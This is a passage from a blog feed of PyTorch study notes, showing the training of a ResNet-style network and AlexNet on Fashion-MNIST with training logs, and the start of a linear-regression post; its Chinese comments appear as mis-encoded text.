  nn.AdaptiveAvgPool2d((<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<br>                    nn.Flatten(), nn.Linear(<span class="hljs-number">512</span>, <span class="hljs-number">10</span>))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">lr, num_epochs, batch_size = <span class="hljs-number">0.05</span>, <span class="hljs-number">10</span>, <span class="hljs-number">256</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_dataloader_workers</span>():  <span class="hljs-comment">#@save</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data_fashion_mnist</span>(<span class="hljs-params">batch_size, resize=<span class="hljs-literal">None</span></span>): <br>    trans = [transforms.ToTensor()]<br>    <span class="hljs-keyword">if</span> resize:<br>        trans.insert(<span class="hljs-number">0</span>, transforms.Resize(resize))<br>    trans = transforms.Compose(trans)<br>    mnist_train = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">True</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    mnist_test = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">False</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> (<br>            data.DataLoader(mnist_train, batch_size, shuffle=<span class="hljs-literal">True</span>, num_workers=get_dataloader_workers()), <br>            data.DataLoader(mnist_test, batch_size, shuffle=<span class="hljs-literal">False</span>, num_workers=get_dataloader_workers())<br>           )<br><br><span class="hljs-comment"># ä¸é‡è¦ï¼Œä¸ç”¨çœ‹</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Accumulator</span>:  <br>    <span class="hljs-string">&quot;&quot;&quot;åœ¨nä¸ªå˜é‡ä¸Šç´¯åŠ &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, n</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * n<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, *args</span>):<br>        self.data = [a + <span class="hljs-built_in">float</span>(b) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.data, args)]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>(<span class="hljs-params">self</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * <span class="hljs-built_in">len</span>(self.data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, idx</span>):<br>        <span class="hljs-keyword">return</span> self.data[idx]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">accuracy</span>(<span class="hljs-params">y_hat, y</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;è®¡ç®—é¢„æµ‹æ­£ç¡®çš„æ•°é‡&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(y_hat.shape) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y_hat.shape[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">1</span>:<br>        y_hat = y_hat.argmax(axis=<span class="hljs-number">1</span>)<br>    cmp = y_hat.<span class="hljs-built_in">type</span>(y.dtype) == y<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(cmp.<span class="hljs-built_in">type</span>(y.dtype).<span class="hljs-built_in">sum</span>())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_accuracy</span>(<span class="hljs-params">net, data_iter,device</span>):  <br>    <span class="hljs-string">&quot;&quot;&quot;è®¡ç®—åœ¨æŒ‡å®šæ•°æ®é›†ä¸Šæ¨¡å‹çš„ç²¾åº¦&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.<span class="hljs-built_in">eval</span>()  <span class="hljs-comment"># å°†æ¨¡å‹è®¾ç½®ä¸ºè¯„ä¼°æ¨¡å¼</span><br>    metric = Accumulator(<span class="hljs-number">2</span>)  <span class="hljs-comment"># æ­£ç¡®é¢„æµ‹æ•°ã€é¢„æµ‹æ€»æ•°</span><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter:<br>            X,y = X.to(device), y.to(device)<br>            metric.add(accuracy(net(X), y), y.numel())<br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_ch6</span>(<span class="hljs-params">net, trian_iter, test_iter, num_epochs, lr, device</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">init_weights</span>(<span class="hljs-params">m</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(m)==nn.Linear <span class="hljs-keyword">or</span> <span class="hljs-built_in">type</span>(m)==nn.Conv2d:<br>            nn.init.xavier_uniform_(m.weight)<br>    net.apply(init_weights)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;training on&#x27;</span> , device)<br><br>    optimizer = torch.optim.SGD(net.parameters(), lr=lr)<br>    loss = nn.CrossEntropyLoss()<br>    <span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>        metric = Accumulator(<span class="hljs-number">3</span>)<br>        net = net.to(device)<br>        net.train()<br>        <span class="hljs-keyword">for</span> i, (X,y) <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">enumerate</span>(train_iter)):<br>            start = time.time()<br>            optimizer.zero_grad() <span class="hljs-comment"># ä¸Šä¸€è½®çš„æ¢¯åº¦å½’é›¶</span><br>            X,y = X.to(device), y.to(device)<br>            y_hat = net(X)<br>            l = loss(y_hat,y)<br>            l.backward() <span class="hljs-comment"># åå‘ä¼ æ’­å¾—åˆ°æ¯ä¸ªå‚æ•°çš„æ¢¯åº¦</span><br>            optimizer.step() <span class="hljs-comment"># å‚æ•°æ›´æ–°</span><br>            <span class="hljs-keyword">with</span> torch.no_grad():<br>                metric.add(l * X.shape[<span class="hljs-number">0</span>], accuracy(y_hat,y), X.shape[<span class="hljs-number">0</span>])<br>            train_l = metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">2</span>]<br>            train_acc = metric[<span class="hljs-number">1</span>] / metric[<span class="hljs-number">2</span>]<br>            test_acc = evaluate_accuracy(net, test_iter,device)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;loss <span class="hljs-subst">&#123;train_l:<span class="hljs-number">.3</span>f&#125;</span>, train acc <span class="hljs-subst">&#123;train_acc:<span class="hljs-number">.3</span>f&#125;</span>,&#x27;</span> <span class="hljs-string">f&#x27;test acc <span class="hljs-subst">&#123;test_acc:<span class="hljs-number">.3</span>f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">train_iter, test_iter = load_data_fashion_mnist(batch_size,resize=<span class="hljs-number">224</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(train_iter),<span class="hljs-built_in">len</span>(test_iter))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">train_ch6(net, train_iter, test_iter, num_epochs, lr, <span class="hljs-string">&#x27;cuda:0&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">loss</span> <span class="hljs-number">1</span>.<span class="hljs-number">786</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">364</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">546</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">864</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">680</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">761</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">597</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">778</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">782</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">500</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">817</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">731</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">431</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">840</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">827</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">391</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">855</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">847</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">364</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">864</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">803</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">334</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">875</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">857</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">878</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">694</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">850</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">352</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">869</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">862</span><br><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">329</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">879</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">877</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">297</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">889</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">859</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">281</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">896</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">873</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">265</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">902</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">886</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">255</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">906</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">878</span><br><span class="hljs-attribute">loss</span> <span class="hljs-number">0</span>.<span class="hljs-number">243</span>, train acc <span class="hljs-number">0</span>.<span class="hljs-number">910</span>,test acc <span class="hljs-number">0</span>.<span class="hljs-number">892</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pytorch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pytorch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AlexNet</title>
    <link href="/2023/11/20/ai/AlexNet/"/>
    <url>/2023/11/20/ai/AlexNet/</url>
    
    <content type="html"><![CDATA[<p>ç”¨çš„æ˜¯fashion mnist</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torch.utils <span class="hljs-keyword">import</span> data<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">batch_size = <span class="hljs-number">1024</span> <span class="hljs-comment"># ä¹¦ä¸Šå†™çš„128</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_dataloader_workers</span>():  <span class="hljs-comment">#@save</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data_fashion_mnist</span>(<span class="hljs-params">batch_size, resize=<span class="hljs-literal">None</span></span>): <br>    trans = [transforms.ToTensor()]<br>    <span class="hljs-keyword">if</span> resize:<br>        trans.insert(<span class="hljs-number">0</span>, transforms.Resize(resize))<br>    trans = transforms.Compose(trans)<br>    mnist_train = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">True</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    mnist_test = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">False</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> (<br>            data.DataLoader(mnist_train, batch_size, shuffle=<span class="hljs-literal">True</span>, num_workers=get_dataloader_workers()), <br>            data.DataLoader(mnist_test, batch_size, shuffle=<span class="hljs-literal">False</span>, num_workers=get_dataloader_workers())<br>           )<br>train_iter, test_iter = load_data_fashion_mnist(batch_size,resize=<span class="hljs-number">224</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(train_iter),<span class="hljs-built_in">len</span>(test_iter))<br></code></pre></td></tr></table></figure><pre><code class="hljs">59 10</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># AlexNet</span><br>net = nn.Sequential(<br>    nn.Conv2d(<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,kernel_size=<span class="hljs-number">11</span>,stride=<span class="hljs-number">4</span>,padding=<span class="hljs-number">1</span>),<br>    nn.ReLU(),<br>    nn.MaxPool2d(kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">2</span>),<br>    nn.Conv2d(<span class="hljs-number">96</span>, <span class="hljs-number">256</span>, kernel_size=<span class="hljs-number">5</span>, padding=<span class="hljs-number">2</span>), <br>    nn.ReLU(),<br>    nn.MaxPool2d(kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">2</span>),<br>    nn.Conv2d(<span class="hljs-number">256</span>, <span class="hljs-number">384</span>, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>), <br>    nn.ReLU(),<br>    nn.Conv2d(<span class="hljs-number">384</span>, <span class="hljs-number">384</span>, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>), <br>    nn.ReLU(),<br>    nn.Conv2d(<span class="hljs-number">384</span>, <span class="hljs-number">256</span>, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>),<br>    nn.ReLU(),<br>    nn.MaxPool2d(kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">2</span>),<br>    nn.Flatten(),<br>    nn.Linear(<span class="hljs-number">6400</span>, <span class="hljs-number">4096</span>), <br>    nn.ReLU(),<br>    nn.Dropout(p=<span class="hljs-number">0.5</span>),<br>    nn.Linear(<span class="hljs-number">4096</span>, <span class="hljs-number">4096</span>), <br>    nn.ReLU(),<br>    nn.Dropout(p=<span class="hljs-number">0.5</span>),<br>    nn.Linear(<span class="hljs-number">4096</span>, <span class="hljs-number">10</span>))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä¸é‡è¦ï¼Œä¸ç”¨çœ‹</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Accumulator</span>:  <br>    <span class="hljs-string">&quot;&quot;&quot;åœ¨nä¸ªå˜é‡ä¸Šç´¯åŠ &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, n</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * n<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, *args</span>):<br>        self.data = [a + <span class="hljs-built_in">float</span>(b) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.data, args)]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>(<span class="hljs-params">self</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * <span class="hljs-built_in">len</span>(self.data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, idx</span>):<br>        <span class="hljs-keyword">return</span> self.data[idx]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">accuracy</span>(<span class="hljs-params">y_hat, y</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;è®¡ç®—é¢„æµ‹æ­£ç¡®çš„æ•°é‡&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(y_hat.shape) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y_hat.shape[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">1</span>:<br>        y_hat = y_hat.argmax(axis=<span class="hljs-number">1</span>)<br>    cmp = y_hat.<span class="hljs-built_in">type</span>(y.dtype) == y<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(cmp.<span class="hljs-built_in">type</span>(y.dtype).<span class="hljs-built_in">sum</span>())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_accuracy</span>(<span class="hljs-params">net, data_iter,device</span>):  <br>    <span class="hljs-string">&quot;&quot;&quot;è®¡ç®—åœ¨æŒ‡å®šæ•°æ®é›†ä¸Šæ¨¡å‹çš„ç²¾åº¦&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.<span class="hljs-built_in">eval</span>()  <span class="hljs-comment"># å°†æ¨¡å‹è®¾ç½®ä¸ºè¯„ä¼°æ¨¡å¼</span><br>    metric = Accumulator(<span class="hljs-number">2</span>)  <span class="hljs-comment"># æ­£ç¡®é¢„æµ‹æ•°ã€é¢„æµ‹æ€»æ•°</span><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter:<br>            X,y = X.to(device), y.to(device)<br>            metric.add(accuracy(net(X), y), y.numel())<br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_ch6</span>(<span class="hljs-params">net, trian_iter, test_iter, num_epochs, lr, device</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">init_weights</span>(<span class="hljs-params">m</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(m)==nn.Linear <span class="hljs-keyword">or</span> <span class="hljs-built_in">type</span>(m)==nn.Conv2d:<br>            nn.init.xavier_uniform_(m.weight)<br>    net.apply(init_weights)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;training on&#x27;</span> , device)<br><br>    optimizer = torch.optim.SGD(net.parameters(), lr=lr)<br>    loss = nn.CrossEntropyLoss()<br>    <span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>        metric = Accumulator(<span class="hljs-number">3</span>)<br>        net = net.to(device)<br>        net.train()<br>        <span class="hljs-keyword">for</span> i, (X,y) <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">enumerate</span>(train_iter)):<br>            start = time.time()<br>            optimizer.zero_grad() <span class="hljs-comment"># ä¸Šä¸€è½®çš„æ¢¯åº¦å½’é›¶</span><br>            X,y = X.to(device), y.to(device)<br>            y_hat = net(X)<br>            l = loss(y_hat,y)<br>            l.backward() <span class="hljs-comment"># åå‘ä¼ æ’­å¾—åˆ°æ¯ä¸ªå‚æ•°çš„æ¢¯åº¦</span><br>            optimizer.step() <span class="hljs-comment"># å‚æ•°æ›´æ–°</span><br>            <span class="hljs-keyword">with</span> torch.no_grad():<br>                metric.add(l * X.shape[<span class="hljs-number">0</span>], accuracy(y_hat,y), X.shape[<span class="hljs-number">0</span>])<br>            train_l = metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">2</span>]<br>            train_acc = metric[<span class="hljs-number">1</span>] / metric[<span class="hljs-number">2</span>]<br>            test_acc = evaluate_accuracy(net, test_iter,device)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;loss <span class="hljs-subst">&#123;train_l:<span class="hljs-number">.3</span>f&#125;</span>, train acc <span class="hljs-subst">&#123;train_acc:<span class="hljs-number">.3</span>f&#125;</span>,&#x27;</span> <span class="hljs-string">f&#x27;test acc <span class="hljs-subst">&#123;test_acc:<span class="hljs-number">.3</span>f&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;metric[<span class="hljs-number">2</span>] * num_epochs / ( time.time() - start ) :<span class="hljs-number">.1</span>f&#125;</span> examples/sec &#x27;</span>  <span class="hljs-string">f&#x27;on <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(device)&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">lr, num_epochs = <span class="hljs-number">0.01</span>, <span class="hljs-number">10</span><br>train_ch6(net, train_iter, test_iter, num_epochs, lr, <span class="hljs-string">&#x27;cuda:0&#x27;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">training on cuda:059it [02:46,  2.83s/it]loss 2.283, train acc 0.256,test acc 0.328211869.9 examples/sec on cuda:0</code></pre><p>â€‹<br>â€‹    59it [02:48,  2.86s/it]<br>â€‹<br>â€‹    loss 1.832, train acc 0.430,test acc 0.549<br>â€‹    230051.2 examples/sec on cuda:0</p><p>â€‹<br>â€‹    59it [02:52,  2.92s/it]<br>â€‹<br>â€‹    loss 1.085, train acc 0.596,test acc 0.598<br>â€‹    233088.3 examples/sec on cuda:0</p><p>â€‹<br>â€‹    59it [02:44,  2.79s/it]<br>â€‹<br>â€‹    loss 0.885, train acc 0.666,test acc 0.701<br>â€‹    221954.7 examples/sec on cuda:0</p><p>â€‹<br>â€‹    59it [02:41,  2.74s/it]<br>â€‹<br>â€‹    loss 0.787, train acc 0.703,test acc 0.743<br>â€‹    226613.6 examples/sec on cuda:0</p><p>â€‹<br>â€‹    59it [02:46,  2.82s/it]<br>â€‹<br>â€‹    loss 0.712, train acc 0.730,test acc 0.738<br>â€‹    214793.3 examples/sec on cuda:0</p><p>â€‹    59it [02:50,  2.90s/it]<br>â€‹    </p><pre><code class="hljs">loss 0.668, train acc 0.751,test acc 0.727228293.3 examples/sec on cuda:0</code></pre><p>â€‹    53it [02:28,  2.83s/it]</p>]]></content>
    
    
    <categories>
      
      <category>pytorch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pytorch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linear regression</title>
    <link href="/2023/11/19/ai/linear%20regression/"/>
    <url>/2023/11/19/ai/linear%20regression/</url>
    
    <content type="html"><![CDATA[<h3 id="1-è‡ªå·±å†™loss-optim-nn-Sequential-dataloader"><a href="#1-è‡ªå·±å†™loss-optim-nn-Sequential-dataloader" class="headerlink" title="1  è‡ªå·±å†™loss optim nn.Sequential dataloader"></a>1  è‡ªå·±å†™loss optim nn.Sequential dataloader</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> d2l <span class="hljs-keyword">import</span> torch <span class="hljs-keyword">as</span> d2l<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">synthetic_data</span>(<span 